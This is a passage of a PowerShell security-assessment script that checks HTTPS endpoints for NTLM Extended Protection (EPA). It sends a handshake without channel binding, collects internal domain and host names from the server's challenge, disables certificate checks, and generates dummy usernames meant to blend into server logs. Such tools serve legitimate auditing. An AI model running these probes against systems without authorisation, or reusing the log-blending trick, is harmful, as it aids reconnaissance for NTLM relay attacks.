    - Each HTTP request (Type1 and Type3) has its own timeout
    - Slow connections with many small packets may exceed TimeoutSeconds total

.NOTES
    Author: Alexander Sturz (@_61106960_)
#>

# Global RNG instance for efficiency (thread-safe, created once)
$Script:NTLM_RNG = $null

function Get-NTLMSecureRNG {
    <#
    .SYNOPSIS
        Returns a shared cryptographically secure RNG instance.
    .DESCRIPTION
        Creates or returns a shared RandomNumberGenerator instance.
        This avoids creating/disposing RNG for each random operation.
    #>
    if ($null -eq $Script:NTLM_RNG) {
        $Script:NTLM_RNG = [System.Security.Cryptography.RandomNumberGenerator]::Create()
    }
    return $Script:NTLM_RNG
}

# NTLM Message Type Constants
$Script:NTLM_TYPE1 = 1
$Script:NTLM_TYPE2 = 2
$Script:NTLM_TYPE3 = 3

# NTLM Negotiate Flags
# Note: High-bit values (0x80000000) must use "2147483648" decimal notation
# because PowerShell interprets hex literals as Int32 first, causing overflow
$Script:NTLMSSP_NEGOTIATE_UNICODE = [uint32]0x00000001
$Script:NTLMSSP_NEGOTIATE_OEM = [uint32]0x00000002
$Script:NTLMSSP_REQUEST_TARGET = [uint32]0x00000004
$Script:NTLMSSP_NEGOTIATE_SIGN = [uint32]0x00000010
$Script:NTLMSSP_NEGOTIATE_SEAL = [uint32]0x00000020
$Script:NTLMSSP_NEGOTIATE_DATAGRAM = [uint32]0x00000040
$Script:NTLMSSP_NEGOTIATE_LM_KEY = [uint32]0x00000080
$Script:NTLMSSP_NEGOTIATE_NTLM = [uint32]0x00000200
$Script:NTLMSSP_NEGOTIATE_OEM_DOMAIN_SUPPLIED = [uint32]0x00001000
$Script:NTLMSSP_NEGOTIATE_OEM_WORKSTATION_SUPPLIED = [uint32]0x00002000
$Script:NTLMSSP_NEGOTIATE_ALWAYS_SIGN = [uint32]0x00008000
$Script:NTLMSSP_TARGET_TYPE_DOMAIN = [uint32]0x00010000
$Script:NTLMSSP_TARGET_TYPE_SERVER = [uint32]0x00020000
$Script:NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY = [uint32]0x00080000
$Script:NTLMSSP_NEGOTIATE_TARGET_INFO = [uint32]0x00800000
$Script:NTLMSSP_NEGOTIATE_VERSION = [uint32]0x02000000
$Script:NTLMSSP_NEGOTIATE_128 = [uint32]0x20000000
$Script:NTLMSSP_NEGOTIATE_KEY_EXCH = [uint32]0x40000000
$Script:NTLMSSP_NEGOTIATE_56 = [uint32]2147483648  # 0x80000000 - must use decimal for high-bit

<#
.SYNOPSIS
    Creates an NTLM Type1 (Negotiate) message.
.DESCRIPTION
    Builds an NTLM Type1 message that initiates the NTLM handshake.
    The message includes negotiate flags but no domain/workstation info.
.RETURNS
    Base64-encoded NTLM Type1 message.
#>
function New-NTLMType1Message {
    [CmdletBinding()]
    param()

    # NTLMSSP signature
    $signature = [System.Text.Encoding]::ASCII.GetBytes("NTLMSSP`0")

    # Message type (1 = Negotiate)
    $messageType = [BitConverter]::GetBytes([uint32]1)

    # Negotiate flags - request extended session security but NOT Channel Binding
    # This is key for EPA testing - we explicitly don't include CBT
    # Note: All flag constants are already [uint32], combine with -bor and ensure result stays [uint32]
    [uint32]$flags = $Script:NTLMSSP_NEGOTIATE_UNICODE -bor
                     $Script:NTLMSSP_REQUEST_TARGET -bor
                     $Script:NTLMSSP_NEGOTIATE_NTLM -bor
                     $Script:NTLMSSP_NEGOTIATE_ALWAYS_SIGN -bor
                     $Script:NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY -bor
                     $Script:NTLMSSP_NEGOTIATE_128 -bor
                     $Script:NTLMSSP_NEGOTIATE_56

    $flagsBytes = [BitConverter]::GetBytes($flags)

    # Domain name fields (empty - offset 0, length 0)
    $domainLen = [BitConverter]::GetBytes([uint16]0)
    $domainMaxLen = [BitConverter]::GetBytes([uint16]0)
    $domainOffset = [BitConverter]::GetBytes([uint32]0)

    # Workstation name fields (empty - offset 0, length 0)
    $workstationLen = [BitConverter]::GetBytes([uint16]0)
    $workstationMaxLen = [BitConverter]::GetBytes([uint16]0)
    $workstationOffset = [BitConverter]::GetBytes([uint32]0)

    # Build the message
    $message = New-Object System.Collections.Generic.List[byte]
    $message.AddRange($signature)           # 0-7:   "NTLMSSP\0"
    $message.AddRange($messageType)         # 8-11:  Type (1)
    $message.AddRange($flagsBytes)          # 12-15: Flags
    $message.AddRange($domainLen)           # 16-17: Domain length
    $message.AddRange($domainMaxLen)        # 18-19: Domain max length
    $message.AddRange($domainOffset)        # 20-23: Domain offset
    $message.AddRange($workstationLen)      # 24-25: Workstation length
    $message.AddRange($workstationMaxLen)   # 26-27: Workstation max length
    $message.AddRange($workstationOffset)   # 28-31: Workstation offset

    return [Convert]::ToBase64String($message.ToArray())
}

# AV_PAIR Type IDs (MS-NLMP 2.2.2.1)
$Script:MsvAvEOL = 0x0000              # End of list
$Script:MsvAvNbComputerName = 0x0001   # NetBIOS computer name
$Script:MsvAvNbDomainName = 0x0002     # NetBIOS domain name
$Script:MsvAvDnsComputerName = 0x0003  # DNS computer name (FQDN)
$Script:MsvAvDnsDomainName = 0x0004    # DNS domain name
$Script:MsvAvDnsTreeName = 0x0005      # DNS forest name
$Script:MsvAvFlags = 0x0006            # Flags (bit 0x02 = EPA required)
$Script:MsvAvTimestamp = 0x0007        # FILETIME timestamp
$Script:MsvAvSingleHost = 0x0008       # Single host data
$Script:MsvAvTargetName = 0x0009       # SPN target name
$Script:MsvAvChannelBindings = 0x000A  # Channel bindings MD5 hash

<#
.SYNOPSIS
    Parses an NTLM Type2 (Challenge) message with full AV_PAIR extraction.
.DESCRIPTION
    Extracts the server challenge, target info, and all AV_PAIRs from an NTLM Type2 message.
    AV_PAIRs contain valuable internal information:
    - MsvAvNbComputerName (0x0001): NetBIOS hostname
    - MsvAvNbDomainName (0x0002): NetBIOS domain name
    - MsvAvDnsComputerName (0x0003): DNS hostname (FQDN)
    - MsvAvDnsDomainName (0x0004): DNS domain name
    - MsvAvDnsTreeName (0x0005): DNS forest/tree name
    - MsvAvFlags (0x0006): Flags (bit 0x02 indicates EPA required)
    - MsvAvTimestamp (0x0007): Server timestamp (FILETIME)
.PARAMETER Type2Base64
    Base64-encoded NTLM Type2 message from server.
.RETURNS
    PSCustomObject with Challenge, TargetName, TargetInfo, Flags, and parsed AV_PAIRs.
#>
function Read-NTLMType2Message {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$Type2Base64
    )

    try {
        $bytes = [Convert]::FromBase64String($Type2Base64)

        # Validate minimum length for Type2 message
        if ($bytes.Length -lt 32) {
            throw "Type2 message too short (minimum 32 bytes, got $($bytes.Length))"
        }

        # Validate signature
        $signature = [System.Text.Encoding]::ASCII.GetString($bytes, 0, 8)
        if ($signature -ne "NTLMSSP`0") {
            throw "Invalid NTLM signature"
        }

        # Validate message type
        $messageType = [BitConverter]::ToUInt32($bytes, 8)
        if ($messageType -ne 2) {
            throw "Not a Type2 message (got type $messageType)"
        }

        # Extract fields
        $targetNameLen = [BitConverter]::ToUInt16($bytes, 12)
        $targetNameOffset = [BitConverter]::ToInt32($bytes, 16)
        # Read flags directly from bytes to avoid Int32/UInt32 conversion issues in PowerShell
        $flags = [uint32]$bytes[20] + ([uint32]$bytes[21] -shl 8) + ([uint32]$bytes[22] -shl 16) + ([uint32]$bytes[23] -shl 24)
        $challenge = $bytes[24..31]

        # Target info (if present)
        $targetInfoLen = 0
        $targetInfoOffset = 0
        $targetInfo = $null
        $avPairs = $null

        if ($bytes.Length -ge 48) {
            $targetInfoLen = [BitConverter]::ToUInt16($bytes, 40)
            $targetInfoOffset = [BitConverter]::ToInt32($bytes, 44)

            # FIX: Allow offset 0 if length is also 0, otherwise validate bounds
            if ($targetInfoLen -gt 0 -and $targetInfoOffset -ge 0 -and ($targetInfoOffset + $targetInfoLen) -le $bytes.Length) {
                $targetInfo = $bytes[$targetInfoOffset..($targetInfoOffset + $targetInfoLen - 1)]

                # Parse AV_PAIRs from TargetInfo
                $avPairs = Read-NTLMAvPairs -TargetInfoBytes $targetInfo
            }
        }

        # Initialize default avPairs if not parsed
        if ($null -eq $avPairs) {
            $avPairs = [PSCustomObject]@{
                NbComputerName = $null
                NbDomainName = $null
                DnsComputerName = $null
                DnsDomainName = $null
                DnsTreeName = $null
                AvFlags = $null
                EPARequired = $false
                Timestamp = $null
                TimestampUtc = $null
                TargetSPN = $null
            }
        }

        # Extract target name
        $targetName = ""
        if ($targetNameLen -gt 0 -and $targetNameOffset -ge 0 -and ($targetNameOffset + $targetNameLen) -le $bytes.Length) {
            if (($flags -band $Script:NTLMSSP_NEGOTIATE_UNICODE) -ne 0) {
                $targetName = [System.Text.Encoding]::Unicode.GetString($bytes, $targetNameOffset, $targetNameLen)
            } else {
                $targetName = [System.Text.Encoding]::ASCII.GetString($bytes, $targetNameOffset, $targetNameLen)
            }
        }

        return [PSCustomObject]@{
            Success = $true
            Challenge = $challenge
            ChallengeHex = [BitConverter]::ToString($challenge) -replace '-', ''
            TargetName = $targetName
            TargetInfo = $targetInfo
            Flags = $flags
            # Parsed AV_PAIR values
            NbComputerName = $avPairs.NbComputerName
            NbDomainName = $avPairs.NbDomainName
            DnsComputerName = $avPairs.DnsComputerName
            DnsDomainName = $avPairs.DnsDomainName
            DnsTreeName = $avPairs.DnsTreeName
            Timestamp = $avPairs.Timestamp
            TimestampUtc = $avPairs.TimestampUtc
            AvFlags = $avPairs.AvFlags
            EPARequired = $avPairs.EPARequired
            TargetSPN = $avPairs.TargetSPN
        }
    }
    catch {
        return [PSCustomObject]@{
            Success = $false
            Error = $_.Exception.Message
        }
    }
}

<#
.SYNOPSIS
    Parses AV_PAIRs from NTLM TargetInfo field.
.DESCRIPTION
    AV_PAIR structure (MS-NLMP 2.2.2.1):
    - AvId (2 bytes): Type identifier
    - AvLen (2 bytes): Length of Value
    - Value (AvLen bytes): The actual data

    The list is terminated by MsvAvEOL (0x0000).
.PARAMETER TargetInfoBytes
    Raw bytes of the TargetInfo field from Type2 message.
.RETURNS
    PSCustomObject with parsed AV_PAIR values.
#>
function Read-NTLMAvPairs {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [byte[]]$TargetInfoBytes
    )

    $result = [PSCustomObject]@{
        NbComputerName = $null    # NetBIOS computer name
        NbDomainName = $null      # NetBIOS domain name
        DnsComputerName = $null   # DNS computer name (FQDN)
        DnsDomainName = $null     # DNS domain name
        DnsTreeName = $null       # DNS forest name
        AvFlags = $null           # Raw flags value
        EPARequired = $false      # True if flag 0x02 is set
        Timestamp = $null         # Raw FILETIME (Int64)
        TimestampUtc = $null      # Parsed DateTime in UTC
        TargetSPN = $null         # Target SPN (if present)
        RawPairs = @{}            # All pairs for debugging
    }

    $offset = 0
    $length = $TargetInfoBytes.Length

    while ($offset + 4 -le $length) {
        # Read AvId (2 bytes) and AvLen (2 bytes)
        $avId = [BitConverter]::ToUInt16($TargetInfoBytes, $offset)
        $avLen = [BitConverter]::ToUInt16($TargetInfoBytes, $offset + 2)
        $offset += 4

        # End of list?
        if ($avId -eq $Script:MsvAvEOL) {
            break
        }

        # Bounds check for value
        if ($offset + $avLen -gt $length) {
            Write-Log "[Read-NTLMAvPairs] Truncated AV_PAIR at offset $offset"
            break
        }

        # Extract value bytes
        $valueBytes = $TargetInfoBytes[$offset..($offset + $avLen - 1)]
        $offset += $avLen

        # Parse based on AvId
        switch ($avId) {
            $Script:MsvAvNbComputerName {
                # Unicode string
                $result.NbComputerName = [System.Text.Encoding]::Unicode.GetString($valueBytes)
                $result.RawPairs['MsvAvNbComputerName'] = $result.NbComputerName
            }
            $Script:MsvAvNbDomainName {
                $result.NbDomainName = [System.Text.Encoding]::Unicode.GetString($valueBytes)
                $result.RawPairs['MsvAvNbDomainName'] = $result.NbDomainName
            }
            $Script:MsvAvDnsComputerName {
                $result.DnsComputerName = [System.Text.Encoding]::Unicode.GetString($valueBytes)
                $result.RawPairs['MsvAvDnsComputerName'] = $result.DnsComputerName
            }
            $Script:MsvAvDnsDomainName {
                $result.DnsDomainName = [System.Text.Encoding]::Unicode.GetString($valueBytes)
                $result.RawPairs['MsvAvDnsDomainName'] = $result.DnsDomainName
            }
            $Script:MsvAvDnsTreeName {
                $result.DnsTreeName = [System.Text.Encoding]::Unicode.GetString($valueBytes)
                $result.RawPairs['MsvAvDnsTreeName'] = $result.DnsTreeName
            }
            $Script:MsvAvFlags {
                # 4-byte flags value - read bytes directly to avoid conversion issues
                if ($avLen -ge 4) {
                    $result.AvFlags = [uint32]$valueBytes[0] + ([uint32]$valueBytes[1] -shl 8) + ([uint32]$valueBytes[2] -shl 16) + ([uint32]$valueBytes[3] -shl 24)
                    # Bit 0x02 = MIC present / EPA required
                    $result.EPARequired = ($result.AvFlags -band 0x02) -ne 0
                    $result.RawPairs['MsvAvFlags'] = "0x{0:X8}" -f $result.AvFlags
                }
            }
            $Script:MsvAvTimestamp {
                # 8-byte FILETIME
                if ($avLen -ge 8) {
                    $result.Timestamp = [BitConverter]::ToInt64($valueBytes, 0)
                    try {
                        # Convert FILETIME to DateTime
                        $result.TimestampUtc = [DateTime]::FromFileTimeUtc($result.Timestamp)
                        $result.RawPairs['MsvAvTimestamp'] = $result.TimestampUtc.ToString("yyyy-MM-dd HH:mm:ss UTC")
                    }
                    catch {
                        $result.RawPairs['MsvAvTimestamp'] = "Invalid FILETIME: $($result.Timestamp)"
                    }
                }
            }
            $Script:MsvAvTargetName {
                $result.TargetSPN = [System.Text.Encoding]::Unicode.GetString($valueBytes)
                $result.RawPairs['MsvAvTargetName'] = $result.TargetSPN
            }
            $Script:MsvAvChannelBindings {
                # 16-byte MD5 hash of channel bindings (for EPA)
                $result.RawPairs['MsvAvChannelBindings'] = [BitConverter]::ToString($valueBytes) -replace '-', ''
            }
            $Script:MsvAvSingleHost {
                # Complex structure, just store hex
                $result.RawPairs['MsvAvSingleHost'] = [BitConverter]::ToString($valueBytes) -replace '-', ''
            }
            default {
                # Unknown AV_PAIR, store as hex
                $result.RawPairs["Unknown_0x{0:X4}" -f $avId] = [BitConverter]::ToString($valueBytes) -replace '-', ''
            }
        }
    }

    return $result
}

<#
.SYNOPSIS
    Generates a random identifier for EPA testing.
.DESCRIPTION
    Creates a random identifier that looks like a typical Windows account name.
    Uses a common prefix followed by random characters to blend in with normal log entries.
    Uses cryptographically secure random number generation.
.PARAMETER Type
    Type of identifier to generate: "Username" or "Workstation".
.RETURNS
    Random identifier string (e.g., "svc.a7k2mq9", "WS-X4P2N8").
#>
function New-RandomEPAIdentifier {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$false)]
        [ValidateSet('Username', 'Workstation')]
        [string]$Type = 'Username'
    )

    # Use shared cryptographically secure random number generator
    $rng = Get-NTLMSecureRNG

    if ($Type -eq 'Workstation') {
        # Workstation prefixes that look like typical enterprise naming
        $prefixes = @('WS', 'PC', 'DT', 'NB', 'VM', 'SRV')
    }
    else {
        # Username prefixes that look like typical service/admin accounts
        $prefixes = @('admin', 'user', 'test', 'svc', 'app', 'sys', 'dev', 'ops')
    }

    # Generate random bytes for prefix selection
    $prefixBytes = New-Object byte[] 1
    $rng.GetBytes($prefixBytes)
    $prefix = $prefixes[$prefixBytes[0] % $prefixes.Count]

    # Generate random suffix length (5-8 chars)
    $lengthBytes = New-Object byte[] 1
    $rng.GetBytes($lengthBytes)
    $suffixLength = 5 + ($lengthBytes[0] % 4)

    # Generate random suffix using CSPRNG
    $chars = 'abcdefghijklmnopqrstuvwxyz0123456789'
    if ($Type -eq 'Workstation') {
        $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    }

    $suffixBytes = New-Object byte[] $suffixLength
    $rng.GetBytes($suffixBytes)
    $suffix = -join ($suffixBytes | ForEach-Object { $chars[$_ % $chars.Length] })

    if ($Type -eq 'Workstation') {
        return "$prefix-$suffix"
    }
    else {
        return "$prefix.$suffix"
    }
}

<#
.SYNOPSIS
    Creates an NTLM Type3 (Authenticate) message WITHOUT Channel Binding Token.
.DESCRIPTION
    Builds an NTLM Type3 message with dummy credentials for EPA testing.
    The message intentionally does NOT include a Channel Binding Token (MsvAvChannelBindings).
    If EPA is enabled, the server will reject this authentication attempt.
.PARAMETER Type2Result
    Parsed Type2 message from Read-NTLMType2Message. Must have Success=$true and contain Flags property.
.PARAMETER Username
    Username for the dummy authentication. If not specified, a random username is generated
    at runtime to avoid predictable patterns in server logs.
.PARAMETER Domain
    Domain for the dummy authentication (default: "WORKGROUP").
.RETURNS
    Base64-encoded NTLM Type3 message, or $null if Type2Result is invalid.
#>
function New-NTLMType3Message {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        $Type2Result,

        [Parameter(Mandatory=$false)]
        [string]$Username,

        [Parameter(Mandatory=$false)]
        [string]$Domain = "WORKGROUP"
    )

    # Validate Type2Result parameter
    if ($null -eq $Type2Result) {
        Write-Log "[New-NTLMType3Message] Error: Type2Result is null"
        return $null
    }
    if ($Type2Result.PSObject.Properties['Success'] -and -not $Type2Result.Success) {
        Write-Log "[New-NTLMType3Message] Error: Type2Result.Success is false"
        return $null
    }
    if ($null -eq $Type2Result.Flags) {
        Write-Log "[New-NTLMType3Message] Error: Type2Result.Flags is null"
        return $null
    }

    # Generate random username if not provided
    if ([string]::IsNullOrEmpty($Username)) {
        $Username = New-RandomEPAIdentifier -Type 'Username'
    }

    # Generate random workstation name
    $workstationName = New-RandomEPAIdentifier -Type 'Workstation'

    # NTLMSSP signature
    $signature = [System.Text.Encoding]::ASCII.GetBytes("NTLMSSP`0")

    # Message type (3 = Authenticate)
    $messageType = [BitConverter]::GetBytes([uint32]3)

    # Use Unicode encoding
    $domainBytes = [System.Text.Encoding]::Unicode.GetBytes($Domain)
    $usernameBytes = [System.Text.Encoding]::Unicode.GetBytes($Username)
    $workstationBytes = [System.Text.Encoding]::Unicode.GetBytes($workstationName)

    # Generate dummy LM and NT responses using shared CSPRNG (cryptographically secure)
    # For EPA testing, we just need to complete the handshake - the credentials are irrelevant
    $lmResponse = New-Object byte[] 24
    $ntResponse = New-Object byte[] 24
    $rng = Get-NTLMSecureRNG
    $rng.GetBytes($lmResponse)
    $rng.GetBytes($ntResponse)

    # Calculate offsets
    # Type3 header structure (MS-NLMP 2.2.1.3):
    # - Signature: 8 bytes (0-7)
    # - MessageType: 4 bytes (8-11)
    # - LmChallengeResponse: 8 bytes (12-19) - len/maxlen/offset
    # - NtChallengeResponse: 8 bytes (20-27)
    # - DomainName: 8 bytes (28-35)
    # - UserName: 8 bytes (36-43)
    # - Workstation: 8 bytes (44-51)
    # - EncryptedRandomSessionKey: 8 bytes (52-59)
    # - NegotiateFlags: 4 bytes (60-63)
    # Total fixed header: 64 bytes
    # Optional Version: 8 bytes (64-71) - if NTLMSSP_NEGOTIATE_VERSION
    # Optional MIC: 16 bytes (72-87) - if MsvAvFlags indicates MIC required
    # We include Version but no MIC since we don't have valid credentials
    $headerSize = 72  # 64 + 8 for version
    $currentOffset = $headerSize

    $lmResponseOffset = $currentOffset
    $currentOffset += $lmResponse.Length

    $ntResponseOffset = $currentOffset
    $currentOffset += $ntResponse.Length

    $domainOffset = $currentOffset
    $currentOffset += $domainBytes.Length

    $usernameOffset = $currentOffset
    $currentOffset += $usernameBytes.Length

    $workstationOffset = $currentOffset
    $currentOffset += $workstationBytes.Length

    # Negotiate flags - match Type2 response but ensure UNICODE and VERSION
    # Explicitly cast to [uint32] to prevent Int32 overflow issues with high-bit flags
    [uint32]$flags = [uint32]$Type2Result.Flags -bor $Script:NTLMSSP_NEGOTIATE_UNICODE -bor $Script:NTLMSSP_NEGOTIATE_VERSION

    # Build the message
    $message = New-Object System.Collections.Generic.List[byte]

    # Header
    $message.AddRange($signature)                                           # 0-7:   Signature
    $message.AddRange($messageType)                                         # 8-11:  Type (3)

    # LM Response
    $message.AddRange([BitConverter]::GetBytes([uint16]$lmResponse.Length)) # 12-13: LM length
    $message.AddRange([BitConverter]::GetBytes([uint16]$lmResponse.Length)) # 14-15: LM max length
    $message.AddRange([BitConverter]::GetBytes([uint32]$lmResponseOffset))  # 16-19: LM offset

    # NT Response
    $message.AddRange([BitConverter]::GetBytes([uint16]$ntResponse.Length)) # 20-21: NT length
    $message.AddRange([BitConverter]::GetBytes([uint16]$ntResponse.Length)) # 22-23: NT max length
    $message.AddRange([BitConverter]::GetBytes([uint32]$ntResponseOffset))  # 24-27: NT offset

    # Domain
    $message.AddRange([BitConverter]::GetBytes([uint16]$domainBytes.Length))  # 28-29: Domain length
    $message.AddRange([BitConverter]::GetBytes([uint16]$domainBytes.Length))  # 30-31: Domain max length
    $message.AddRange([BitConverter]::GetBytes([uint32]$domainOffset))        # 32-35: Domain offset

    # Username
    $message.AddRange([BitConverter]::GetBytes([uint16]$usernameBytes.Length))  # 36-37: User length
    $message.AddRange([BitConverter]::GetBytes([uint16]$usernameBytes.Length))  # 38-39: User max length
    $message.AddRange([BitConverter]::GetBytes([uint32]$usernameOffset))        # 40-43: User offset

    # Workstation
    $message.AddRange([BitConverter]::GetBytes([uint16]$workstationBytes.Length))  # 44-45: WS length
    $message.AddRange([BitConverter]::GetBytes([uint16]$workstationBytes.Length))  # 46-47: WS max length
    $message.AddRange([BitConverter]::GetBytes([uint32]$workstationOffset))        # 48-51: WS offset

    # Encrypted random session key (empty for EPA test)
    $message.AddRange([BitConverter]::GetBytes([uint16]0))                  # 52-53: Session key length
    $message.AddRange([BitConverter]::GetBytes([uint16]0))                  # 54-55: Session key max length
    $message.AddRange([BitConverter]::GetBytes([uint32]0))                  # 56-59: Session key offset

    # Flags
    $message.AddRange([BitConverter]::GetBytes([uint32]$flags))             # 60-63: Flags

    # Version (8 bytes) - Windows 10 version info
    # ProductMajorVersion: 10 (0x0A)
    # ProductMinorVersion: 0 (0x00)
    # ProductBuild: 19041 (0x4A61)
    # Reserved: 0x000000
    # NTLMRevisionCurrent: 15 (0x0F) = NTLMSSP_REVISION_W2K3
    $version = [byte[]]@(0x0A, 0x00, 0x61, 0x4A, 0x00, 0x00, 0x00, 0x0F)
    $message.AddRange($version)                                             # 64-71: Version

    # Payload
    $message.AddRange($lmResponse)
    $message.AddRange($ntResponse)
    $message.AddRange($domainBytes)
    $message.AddRange($usernameBytes)
    $message.AddRange($workstationBytes)

    return [Convert]::ToBase64String($message.ToArray())
}

<#
.SYNOPSIS
    Tests whether Extended Protection for Authentication (EPA) is enabled on an HTTPS endpoint.
.DESCRIPTION
    Performs a full NTLM handshake over HTTPS without a Channel Binding Token (CBT).
    If EPA is enabled, the server will reject the Type3 message due to missing CBT.

    This function maintains proper NTLM connection state by using a single ServicePoint
    and limiting connections to ensure Type1->Type2->Type3 flow over the same TCP connection.

    EPA Detection Logic (in priority order):
    1. MsvAvFlags in Type2 with bit 0x02 set = EPA ENABLED (definitive, High confidence)
    2. Type3 response has "NTLM <blob>" (new Type2) = EPA ENABLED (High confidence)
    3. Type3 response has bare "NTLM" (no Negotiate prefix) = EPA ENABLED (High confidence)
    4. Type3 response has "Negotiate" or "Negotiate,NTLM" = EPA DISABLED (Medium confidence)
       Note: "Negotiate,NTLM" ends with NTLM but is a normal auth-failure challenge, NOT a restart
    5. Type3 accepted (200/302) = EPA DISABLED (High confidence)
    6. Connection reset after Type3 = EPA ENABLED (Medium confidence)

.PARAMETER Url
    The HTTPS URL to test (must be HTTPS for EPA to be relevant).
.PARAMETER TimeoutSeconds
    HTTP request timeout in seconds (default: 10).
.PARAMETER UserAgent
    HTTP User-Agent header (default: "Mozilla/5.0").
.RETURNS
    PSCustomObject with:
    - Success: $true if EPA test completed, $false if test could not run
    - EPAEnabled: $true (EPA active/secure), $false (EPA inactive/vulnerable), $null (unknown/N/A)
    - Confidence: "High", "Medium", "Low", "Unknown", "N/A"
    - Type2Received, Type3Response, Type3StatusCode, ErrorMessage, DiagnosticInfo
    - Server info from NTLM Type2 AV_PAIRs (NbComputerName, DnsComputerName, etc.)
#>
function Test-ExtendedProtection {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$Url,

        [Parameter(Mandatory=$false)]
        [int]$TimeoutSeconds = 10,

        [Parameter(Mandatory=$false)]
        [string]$UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    )

    $result = [PSCustomObject]@{
        Success = $false           # True if EPA test completed (not if EPA is enabled)
        EPAEnabled = $null         # $true = EPA active (secure), $false = EPA not active (vulnerable), $null = unknown/N/A
        Confidence = "Unknown"     # "High", "Medium", "Low", "Unknown", "N/A"
        Type2Received = $false
        Type3Response = $null
        Type3StatusCode = $null
        ErrorMessage = $null
        DiagnosticInfo = $null
        # Server information from NTLM Type2 AV_PAIRs
        NbComputerName = $null     # NetBIOS computer name
        NbDomainName = $null       # NetBIOS domain name
        DnsComputerName = $null    # DNS computer name (FQDN)
        DnsDomainName = $null      # DNS domain name
        DnsTreeName = $null        # DNS forest name
        ServerTimestamp = $null    # Server time (DateTime)
        NTLMChallenge = $null      # NTLM challenge (hex)
    }

    # FIX: Validate URL syntax before processing
    $uri = $null
    try {
        $uri = [System.Uri]$Url
    }
    catch {
        $result.ErrorMessage = "Invalid URL syntax: $Url"
        $result.DiagnosticInfo = $_.Exception.Message
        return $result
    }

    # Validate URL is HTTPS (EPA only applies to TLS connections)
    # FIX: For HTTP, EPA is not applicable, so EPAEnabled should be $null (not $false)
    if ($uri.Scheme -ne 'https') {
        $result.Success = $true    # Test completed (we know the answer)
        $result.EPAEnabled = $null # Not applicable (not "disabled")
        $result.Confidence = "N/A"
        $result.ErrorMessage = "EPA only applies to HTTPS connections. HTTP does not use Channel Binding."
        $result.DiagnosticInfo = "HTTP has no TLS channel to bind to - NTLM relay is always possible over HTTP regardless of EPA settings"
        return $result
    }

    Write-Log "[Test-ExtendedProtection] Testing EPA for: $Url"

    # Save original TLS settings to restore later
    $originalSecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol
    $originalCertCallback = [System.Net.ServicePointManager]::ServerCertificateValidationCallback

    # Track ServicePoint and its original connection limit for cleanup
    $servicePoint = $null
    $originalConnectionLimit = $null

    try {
        # Configure TLS - enable all versions and ignore certificate errors
        try {
            $protocols = [System.Net.SecurityProtocolType]::Tls12
            try { $protocols = $protocols -bor [System.Net.SecurityProtocolType]::Tls11 } catch { }
            try { $protocols = $protocols -bor [System.Net.SecurityProtocolType]::Tls } catch { }
            try {
                $protocols = $protocols -bor [System.Net.SecurityProtocolType]::Tls13
            }
            catch {
                # TLS 1.3 not available on this .NET version - this is expected on older systems
                Write-Log "[Test-ExtendedProtection] TLS 1.3 not available: $($_.Exception.Message)"
            }
            [System.Net.ServicePointManager]::SecurityProtocol = $protocols
        }
        catch {
            Write-Log "[Test-ExtendedProtection] Failed to configure TLS: $($_.Exception.Message)"
        }

        # Ignore SSL certificate errors (self-signed, expired, etc.)
        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }

        # FIX: NTLM is connection-oriented - we need Type1->Type2->Type3 on SAME TCP connection
        # Limit connections to 1 for this ServicePoint to ensure connection reuse
        $servicePoint = [System.Net.ServicePointManager]::FindServicePoint($uri)
        if ($servicePoint) {
            $originalConnectionLimit = $servicePoint.ConnectionLimit
            $servicePoint.ConnectionLimit = 1
        }

        # Step 1: Send Type1 to get Type2 challenge
        Write-Log "[Test-ExtendedProtection] Step 1: Sending Type1 to initiate NTLM handshake"

        $type1Message = New-NTLMType1Message
        $type2Base64 = $null
        $type2Result = $null

        try {
            $request1 = [System.Net.HttpWebRequest]::Create($Url)
            $request1.Method = 'GET'
            $request1.Timeout = $TimeoutSeconds * 1000
            $request1.ReadWriteTimeout = $TimeoutSeconds * 1000
            $request1.UserAgent = $UserAgent
            $request1.KeepAlive = $true
            $request1.Headers.Add("Authorization", "NTLM $type1Message")
            # Ensure we don't use pre-authenticated connections
            $request1.PreAuthenticate = $false
            $request1.UnsafeAuthenticatedConnectionSharing = $true

            $response1 = $request1.GetResponse()
            # If we got 200 OK with just Type1, endpoint allows anonymous access or doesn't require NTLM
            $result.Success = $true
            $result.EPAEnabled = $null
            $result.Confidence = "N/A"
            $result.DiagnosticInfo = "Endpoint returned 200 OK - anonymous access allowed or no NTLM auth required. EPA test not applicable."
            $response1.Close()
            $response1.Dispose()
            return $result
        }
        catch [System.Net.WebException] {
            $webEx = $_.Exception
            if ($webEx.Response) {
                $statusCode = [int]$webEx.Response.StatusCode

                if ($statusCode -eq 401) {
                    # Expected - look for Type2 in WWW-Authenticate header
                    $wwwAuth = $webEx.Response.Headers['WWW-Authenticate']

                    if ($wwwAuth -match 'NTLM\s+([A-Za-z0-9+/=]+)') {
                        $type2Base64 = $Matches[1]
                        $result.Type2Received = $true
                        Write-Log "[Test-ExtendedProtection] Step 2: Received Type2 challenge"
                    }
                    else {
                        $result.ErrorMessage = "Server returned 401 but no NTLM Type2 challenge in WWW-Authenticate header"
                        $result.DiagnosticInfo = "WWW-Authenticate: $wwwAuth"
                    }
                }
                else {
                    $result.ErrorMessage = "Unexpected status code: $statusCode"
                }

                # FIX: DO NOT close the response here - closing can terminate the TCP connection
                # which breaks NTLM's connection-oriented state machine.
                # The response will be garbage collected and the connection pool manages lifecycle.
                # Only close on the outer exception handler if we're returning early.
            }
            else {
                $result.ErrorMessage = "Connection failed: $($webEx.Message)"
            }
        }

        if (-not $result.Type2Received) {
            Write-Log "[Test-ExtendedProtection] Failed to receive Type2 challenge"
            return $result
        }

        # Step 2: Parse Type2 message
        $type2Result = Read-NTLMType2Message -Type2Base64 $type2Base64
        if (-not $type2Result.Success) {
            $result.ErrorMessage = "Failed to parse Type2: $($type2Result.Error)"
            return $result
        }

        # Copy AV_PAIR values to result
        $result.NbComputerName = $type2Result.NbComputerName
